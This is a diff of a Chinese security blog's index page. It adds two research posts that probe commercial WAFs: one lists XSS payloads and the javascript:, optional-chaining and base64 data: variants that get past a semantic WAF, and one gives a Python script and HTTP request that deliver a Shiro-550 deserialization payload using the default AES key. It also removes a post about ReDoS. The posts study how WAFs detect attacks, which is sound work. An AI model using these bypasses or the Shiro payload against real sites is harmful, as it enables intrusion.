@@ -177,7 +177,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-count">14</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -219,6 +219,241 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-03-12-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(3)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-03-12-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(3)/" class="post-title-link" itemprop="url">细品某语义waf的xss防护(3)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-03-12 20:38:32 / 修改时间：20:56:13" itemprop="dateCreated datePublished" datetime="2021-03-12T20:38:32+08:00">2021-03-12</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><ul>
+<li>经过前期调研，标签中下面的危险属性可以用来做xss攻击：<ul>
+<li>href属性</li>
+<li>src属性</li>
+<li>on事件属性</li>
+<li>srcdoc属性</li>
+<li>xlink:href</li>
+<li>action</li>
+<li>formaction</li>
+<li>data (object标签)</li>
+</ul>
+</li>
+</ul>
+<p>假设攻击场景如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">漏洞输出位置是 &lt;标签 危险属性&#x3D;&quot;用户输出可控位置&quot;&gt;，比如：</span><br><span class="line">&lt;a href&#x3D;&quot;用户输出可控位置&quot;&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;用户输出可控位置&quot;&gt;</span><br><span class="line"></span><br><span class="line">攻击者不闭合属性值时利用xss攻击,如:</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>经过前期调研，在属性值中有下面这些利用方式：</p>
+<ul>
+<li>javascript:js代码</li>
+<li>js代码   （on事件属性）</li>
+<li>data:text/html</li>
+<li>script脚本地址 (script标签的src属性)</li>
+</ul>
+<p>在这个场景下，不考虑其他的利用手段，验证厂商语义waf的安全防护策略</p>
+<p>分析思路：</p>
+<ul>
+<li>针对在属性中每一种利用方式测试</li>
+</ul>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="javascript-js代码"><a href="#javascript-js代码" class="headerlink" title="javascript:js代码"></a>javascript:js代码</h2><p>攻击场景是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&#x2F;href&#x3D;&quot;用户输出可控点&quot;&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>测试过程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;javascript:console.xxx()   拦截</span><br><span class="line">a&#x3D;javascript:console.log(111);xx&#123;&#96;faji(   不拦截  说明判断了js语法是否正确</span><br><span class="line">a&#x3D;javascript:xxx.consol(11)  不拦截</span><br><span class="line">a&#x3D;javascript:xxx.console(11)  拦截   说明危险对象和危险函数一样，在同一个黑名单里。</span><br><span class="line"></span><br><span class="line">a&#x3D;javascript:xxx.consoleeee(11)    拦截</span><br><span class="line">a&#x3D;javascript:xxx.xxxconsoleeee(11) 不拦截  说明判断是否在黑名单中采用前缀判断</span><br><span class="line"></span><br><span class="line">a&#x3D;javascript:xxxxx()   不拦截</span><br><span class="line">a&#x3D;javascript:alertxxx(11) 拦截</span><br><span class="line">a&#x3D;javascript:alert()   拦截   说明逻辑是 是否存在函数调用 &amp;&amp; 函数名是否在黑名单中</span><br><span class="line"></span><br><span class="line">a&#x3D;javascript:a&#x3D;alert;a(1);  拦截</span><br><span class="line">a&#x3D;javascript:a&#x3D;alert;b(1);  拦截   似乎逻辑是 危险函数赋值 &amp;&amp; 调用函数</span><br><span class="line"></span><br><span class="line">a&#x3D;javascript:a&#x3D;console;b&#96;1&#96;;  拦截</span><br><span class="line">a&#x3D;javascript:a&#x3D;console;b(1);  拦截</span><br><span class="line">a&#x3D;javascript:a&#x3D;&#x2F;**&#x2F;console;b&#96;1&#96;;   拦截 可以确认拦截逻辑是  危险函数赋值 &amp;&amp; 调用函数</span><br><span class="line"></span><br><span class="line">a&#x3D;javascript:alert(&quot;1&quot;)  拦截</span><br><span class="line">a&#x3D;javascript:alert?.(&quot;1&quot;)  应该拦截，但是没有拦截。  说明这里做了js语法解析，且解析器没有支持最新的js语法</span><br><span class="line"></span><br><span class="line">a&#x3D;javascript:console()  不拦截</span><br><span class="line">a&#x3D;javascript:console();xxx.xx()  拦截    </span><br><span class="line">a&#x3D;javascript:consolexxaa();xxx.xx 不拦截   说明只有存在 对象.函数()形式的函数调用 &amp;&amp; 对象名在黑名单中  </span><br><span class="line"></span><br><span class="line">a&#x3D;javascript:window&#x3D;xxx;xxx.xx()   不拦截</span><br><span class="line">a&#x3D;javascript:xxx&#x3D;window;xxx.xx()   拦截    可以确认拦截逻辑是 危险对象赋值 &amp;&amp; 调用函数</span><br></pre></td></tr></table></figure>
+
+<p>小结：</p>
+<ul>
+<li>解析js &amp;&amp; 是否存在”函数()”形式的函数调用 &amp;&amp; 获取调用函数名 &amp;&amp; 函数名在黑名单中（前缀匹配） 则拦截</li>
+<li>解析js &amp;&amp; 是否存在”对象.函数()”形式的函数调用 &amp;&amp; 获取函数名、对象名 &amp;&amp; 将危险对象名扩充到黑名单中 &amp;&amp; (函数名在黑名单中 || 对象名在对象黑名单中)   则拦截</li>
+<li>解析js &amp;&amp; (危险对象赋值 || 危险函数赋值) &amp;&amp; 调用函数    则拦截</li>
+</ul>
+<h2 id="js代码"><a href="#js代码" class="headerlink" title="js代码"></a>js代码</h2><p>攻击场景是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;用户输出点&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>测试过程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;alert()   拦截</span><br><span class="line">a&#x3D;xxxxx()   不拦截  说明逻辑是 是否存在函数调用 &amp;&amp; 函数名是否在黑名单中</span><br><span class="line">a&#x3D;x&#x3D;alert;x(1);   应该拦截，但是没有拦截。   说明这里没有&quot;危险函数赋值 &amp;&amp; 调用函数&quot;的检测逻辑</span><br><span class="line">a&#x3D;console.log(11)   应该拦截，但是也没有拦截   说明没有拦截&quot;危险对象&quot;</span><br><span class="line">xxxx.alert(11)   拦截    确认逻辑是 是否存在函数调用 &amp;&amp; 函数名是否在黑名单中</span><br></pre></td></tr></table></figure>
+
+<p>小结:</p>
+<ul>
+<li>解析js &amp;&amp; 存在”对象.函数()”形式或者”函数()”函数形式的函数调用 &amp;&amp; 函数名是否在黑名单中   则拦截</li>
+</ul>
+<h2 id="data-text-html"><a href="#data-text-html" class="headerlink" title="data:text/html"></a>data:text/html</h2><p>攻击场景是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;用户输出可控点&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>测试过程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data:text&#x2F;html;base64;PGltZy9vbmxvYWQ9eHg  不拦截</span><br><span class="line"></span><br><span class="line">data:text&#x2F;html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+   应该拦截，但是没有拦截. 说明不拦截这种利用场景</span><br></pre></td></tr></table></figure>
+<p>小结：不拦截</p>
+<h2 id="script脚本地址-script标签"><a href="#script脚本地址-script标签" class="headerlink" title="script脚本地址 (script标签)"></a>script脚本地址 (script标签)</h2><p>攻击场景是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;用户输出点&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>测试过程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;a.js  应该拦截，但是没有拦截. 说明不拦截这种攻击场景</span><br></pre></td></tr></table></figure>
+<p>小结：不拦截</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>拦截策略，可能是：</p>
+<ul>
+<li>解析js &amp;&amp; 是否存在”函数()”形式的函数调用 &amp;&amp; 获取调用函数名 &amp;&amp; 函数名在黑名单中（前缀匹配） 则拦截</li>
+<li>解析js &amp;&amp; 是否存在”对象.函数()”形式的函数调用 &amp;&amp; 获取函数名、对象名 &amp;&amp; 将危险对象名扩充到黑名单中 &amp;&amp; (函数名在黑名单中 || 对象名在对象黑名单中)   则拦截</li>
+<li>解析js &amp;&amp; (危险对象赋值 || 危险函数赋值) &amp;&amp; 调用函数    则拦截</li>
+<li>解析js &amp;&amp; 存在”对象.函数()”形式或者”函数()”函数形式的函数调用 &amp;&amp; 函数名是否在黑名单中   则拦截</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-03-12-%E4%BB%8Eshiro-550%E6%BC%8F%E6%B4%9E%E5%93%81%E9%98%BF%E9%87%8C%E4%BA%91waf%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-03-12-%E4%BB%8Eshiro-550%E6%BC%8F%E6%B4%9E%E5%93%81%E9%98%BF%E9%87%8C%E4%BA%91waf%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/" class="post-title-link" itemprop="url">从shiro-550漏洞品阿里云waf规则引擎</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-03-12 18:49:38 / 修改时间：21:02:07" itemprop="dateCreated datePublished" datetime="2021-03-12T18:49:38+08:00">2021-03-12</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>shiro-550漏洞利用时，payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密-&gt;base64编码。</p>
+<p>也有人整理出常见的aes加密密钥 top100 来利用此漏洞。</p>
+<p>如果要在waf中对这个漏洞利用做防护，我能想到的安全策略是：</p>
+<ol>
+<li>根据cookie中的rememberMe的值是否过长、是否符合aes加密特征等 来拦截</li>
+<li>先base64解码，然后aes解密，最后规则匹配原始payload</li>
+</ol>
+<p>第二个方法存在两个问题：</p>
+<ol>
+<li><p>aes解密时密钥是啥？会把top100利用时的密钥全部覆盖？</p>
+</li>
+<li><p>这个方法想起来简单，但是实施起来并不简单。它需要规则引擎支持base64解码和aes解密，并且需要规则中能够很容易描述这个解码顺序。</p>
+<p> 按照我的理解，waf和poc扫描的规则引擎类似，都支持规则描述文件和代码实现方式两种。如果waf规则引擎只支持规则描述文件的形式，不支持用代码来描述防护规则，那写这么一条规则我觉得还挺费劲的。</p>
+</li>
+</ol>
+<p>下面就是我验证阿里云waf是怎么拦截防护shiro-550漏洞的。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>测试payload使用下面脚本生成，其中key使用shiro-550默认key</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">#Python2</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key &#x3D; &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br><span class="line">BS &#x3D; AES.block_size</span><br><span class="line">mode &#x3D; AES.MODE_CBC</span><br><span class="line">iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">encryptor &#x3D; AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pad(s): return s + ((BS - len(s) % BS)</span><br><span class="line">                    * chr(BS - len(s) % BS)).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt_shiro_payload(rememberMe):</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	打印 java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS &quot;&quot; 生成的payload</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	# rememberMe &#x3D; &quot;&quot;&quot;x4xXLguUTO+o2zDz6PKJtR7VQfrG08LE5KTMlw3cViQACMqKZ34wqnB1PIYeWTyiLrx2Dp7Gw3cFHJzwBUdqJXnSWmG7&#x2F;SC7EH6c6OgPNTCgiplznhs61pwsoFU6X9NTHZi+&#x2F;xr2Jo3rh&#x2F;TW1gPqK6y4UGW9nqT6UDFybJLqO4bb7DhNsMkVNB4sZ7SgE1ee4zhY591SECQEDDzkM0EHbc2drf92hgueAEK450IqjUI03s1hq838mziWdE7OtQPQ6CjldBKPrSZ0BNhOGP+epg5SrLpXAjj&#x2F;iwLVCRFE0lIUFtNDc9m8h5JKg&#x2F;SLwa&#x2F;yNTWZ+5DAooRs4+&#x2F;yy1Z6xIe7d+OunTmTMnNXACNthKd96Y8RA4q9TnnS4aV91HbMoo&#x2F;Voy&#x2F;v03expiCm2OBpv72oTUCtV9eoHBByXyUsBDUI9BtN1IfAwjkFYj6fa4w5nAuR4sgbBrVy1KYnbgVN1H3DZ5Lmt8tvz1uhxo+SIQLtJfqhY1NhW10bWNm3F+sSyG7xblEDVgBLWer7ayRwZlv7&#x2F;LejK1NPsjVPd8MvBTHfBMShNaQmS7LRTQssGaxq&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">	data &#x3D; encryptor.decrypt(base64.b64decode(rememberMe))</span><br><span class="line">	print(data)</span><br><span class="line">	print(len(data))</span><br><span class="line"></span><br><span class="line">def encrypt_shiro_payload(originalPayload):</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	originalPayload 是 java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS &quot;http:&#x2F;&#x2F;xxx&quot; 生成的payload</span><br><span class="line"></span><br><span class="line">	打印payload</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	data &#x3D; base64.b64encode(encryptor.encrypt(pad(originalPayload)))</span><br><span class="line">	print(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	encrypt_shiro_payload(&quot;111111&quot;*400)</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>测试攻击请求</p>
+<p> 原始payload是利用ysoerial工具生成： java8 -jar scripts/third_party/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS “”</p>
+<p> payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密→base64编码</p>
+<p> 发送请求后，阿里云waf拦截</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxxx.com</span><br><span class="line">User-Agent: curl&#x2F;7.70.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Cookie: rememberMe&#x3D;x4xXLguUTO+o2zDz6PKJtR7VQfrG08LE5KTMlw3cViQACMqKZ34wqnB1PIYeWTyiLrx2Dp7Gw3cFHJzwBUdqJXnSWmG7&#x2F;SC7EH6c6OgPNTCgiplznhs61pwsoFU6X9NTHZi+&#x2F;xr2Jo3rh&#x2F;TW1gPqK6y4UGW9nqT6UDFybJLqO4bb7DhNsMkVNB4sZ7SgE1ee4zhY591SECQEDDzkM0EHbc2drf92hgueAEK450IqjUI03s1hq838mziWdE7OtQPQ6CjldBKPrSZ0BNhOGP+epg5SrLpXAjj&#x2F;iwLVCRFE0lIUFtNDc9m8h5JKg&#x2F;SLwa&#x2F;yNTWZ+5DAooRs4+&#x2F;yy1Z6xIe7d+OunTmTMnNXACNthKd96Y8RA4q9TnnS4aV91HbMoo&#x2F;Voy&#x2F;v03expiCm2OBpv72oTUCtV9eoHBByXyUsBDUI9BtN1IfAwjkFYj6fa4w5nAuR4sgbBrVy1KYnbgVN1H3DZ5Lmt8tvz1uhxo+SIQLtJfqhY1NhW10bWNm3F+sSyG7xblEDVgBLWer7ayRwZlv7&#x2F;LejK1NPsjVPd8MvBTHfBMShNaQmS7LRTQssGaxp</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>测试正常请求</p>
+<p> 原始payload是 “111111”*400 ，不包含攻击特征。</p>
+<p> payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密-&gt;base64编码</p>
+<p> 结论：正常请求阿里云waf未拦截</p>
+</li>
+</ol>
+<p>对比拦截和不拦截的情况，可以看出来阿里云waf防护防护规则逻辑：先对cookie中的rememberMe做base64解码，然后用默认key(kPH+bIxk5D2deZiIxcaaaA==”) 来做aes解密，最后规则匹配解密后的内容。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还有一些测试在分析过程中没有写，这里直接写出结论：</p>
+<ol>
+<li>阿里云waf仅尝试使用一个默认key来解密。（应该是性能考虑）</li>
+<li>不能根据rememberMe的值过长来拦截，因为正常业务这个值也可能有500+个字节长度。</li>
+</ol>
+<p>虽然不能完全防御shiro-100key扫描，但是阿里云waf这条规则还是挺细致的。从支持rsa解密这一点上感觉背后的规则引擎功能很丰富。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1149,217 +1384,6 @@
 </ul>
 </li>
 </ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-01-24-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8E%9F%E7%90%86%E4%B8%8EReDos%E6%94%BB%E5%87%BB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-01-24-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8E%9F%E7%90%86%E4%B8%8EReDos%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">正则表达式原理与ReDos攻击</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-01-24 17:13:42" itemprop="dateCreated datePublished" datetime="2021-01-24T17:13:42+08:00">2021-01-24</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-01-26 20:01:42" itemprop="dateModified" datetime="2021-01-26T20:01:42+08:00">2021-01-26</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在研究 <a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">ReDos攻击</a> 时，涉及到两个问题</p>
-<ol>
-<li>实现正则表达式的算法，比如NFA和DFA是什么？</li>
-<li>我们用的编程语言如Python、PHP等的正则功能是怎么实现的？</li>
-</ol>
-<h1 id="研究过程"><a href="#研究过程" class="headerlink" title="研究过程"></a>研究过程</h1><h2 id="正则表达式算法"><a href="#正则表达式算法" class="headerlink" title="正则表达式算法"></a>正则表达式算法</h2><p>关于NFA和DFA的讲解和实现，推荐读者看  <a target="_blank" rel="noopener" href="https://time.geekbang.org/column/article/137286?utm_term=zeusULN89&utm_source=app&utm_medium=geektime&utm_campaign=314-presell&utm_content=diyijijiacan0601">16 | NFA和DFA：如何自己实现一个正则表达式工具？</a> 这篇文章，讲得深入浅出，并配有Java代码demo。</p>
-<p>我用Python实现了课程的内容，代码在 <a target="_blank" rel="noopener" href="https://github.com/leveryd/PlayWithCompiler/blob/master/algorithm/regex.py">regex</a>。</p>
-<p>这一部分我想说的是：</p>
-<p>在研究ReDos攻击时，我们只要知道”NFA算法中回溯可能会造成计算量暴增，从而导致ReDos”这个结论就可以。</p>
-<p>不过知道一些算法原理，我感觉可以在我们验证语言是采用哪种算法时心里更有底一些。想要自动化检测可能产生ReDos的正则时，对正则原理也需要知道。</p>
-<h2 id="编程语言的正则是怎么实现的？"><a href="#编程语言的正则是怎么实现的？" class="headerlink" title="编程语言的正则是怎么实现的？"></a>编程语言的正则是怎么实现的？</h2><p>我测试了下面几个语言的正则，我自己把他们划分成两类：</p>
-<ul>
-<li>第一类<ul>
-<li>C  (pcre库)</li>
-<li>Lua</li>
-<li>Nginx (ngx.re模块)</li>
-<li>PHP</li>
-</ul>
-</li>
-<li>第二类<ul>
-<li>Python</li>
-</ul>
-</li>
-</ul>
-<p>测试代码我放在了 <a target="_blank" rel="noopener" href="https://github.com/leveryd/regex_test">regex_test</a></p>
-<p>我划分这两类仅仅依据”是否依赖PCRE库”</p>
-<h3 id="第一类"><a href="#第一类" class="headerlink" title="第一类"></a>第一类</h3><p>先说结论：依赖PCRE实现的正则只要配置好最大回溯次数的，就没有ReDos问题。</p>
-<p>我把”基于PCRE库实现的正则功能”的算到了第一类中，<code>PCRE</code>的详细介绍可以查看man手册。</p>
-<p>PCRE库是有两套API接口的。执行<code>man pcrematching</code>命令可以在man帮助手册查看到算法相关的描述。</p>
-<p>一套是基于NFA算法，调用pcre_exec等函数来做正则匹配；另一套是基于DFA算法，调用pcre_dfa_exec等函数来做正则匹配。</p>
-<p>默认用的都是NFA算法，但是PCRE库提供配置选项，可以控制最大回溯次数，超过了回溯次数后就不匹配了。</p>
-<p>其他语言也同样有配置选项来控制最大回溯次数，比如</p>
-<pre><code>PHP的pcre扩展中, 提供了俩个设置项
-
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pcre.backtrack_limit &#x2F;&#x2F;最大回溯数</span><br><span class="line">pcre.recursion_limit &#x2F;&#x2F;最大嵌套数</span><br></pre></td></tr></table></figure>
-
-Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
-<h3 id="第二类"><a href="#第二类" class="headerlink" title="第二类"></a>第二类</h3><p>先说结论：这一类语言如果没有”最大回溯次数的配置”选项，很容易出现ReDos问题。</p>
-<p>我把”自己实现正则算法”的归在了第二类。</p>
-<p>这里我只看了Python语言的re模块。</p>
-<p>CPython的re模块在c层面相关的文件有</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Modules&#x2F;_sre.c</span><br><span class="line">Modules&#x2F;sre_lib.h</span><br></pre></td></tr></table></figure>
-<p>具体的代码逻辑也没有细看，根据测试结果来看re模块也应该是NFA算法，且源码中没有看到调用PCRE的api所以应该不是基于PCRE实现的。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过写一个小的正则解析器demo可以理解DFA和NFA的原理和区别，NFA转换成DFA后状态机就不存在回溯了，所以DFA算法没有ReDos问题。</p>
-<p>基于PCRE实现的正则基本都有配置选项限制回溯次数，所以出现ReDos的概率会小很多。</p>
-<p>像CPython re模块这种自己实现NFA算法的，又没有控制回溯次数的，就很有可能出现ReDos问题。比如<a target="_blank" rel="noopener" href="https://bugs.python.org/issue39503">CVE-2020-8492</a>、<a target="_blank" rel="noopener" href="https://github.com/python/cpython/commit/0902a2d6b2d1d9dbde36aeaaccf1788ceaa97143">CVE-2018-1060/CVE-2018-1061</a></p>
-<p>为了自动化检测ReDos问题，我们可以基于如<a target="_blank" rel="noopener" href="https://github.com/superhuman/rxxr2">rxxr2</a>类似的工具开发。这些工具有没有一些漏报的情况，就需要另外研究了。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020-12-27-Bash%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Case/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
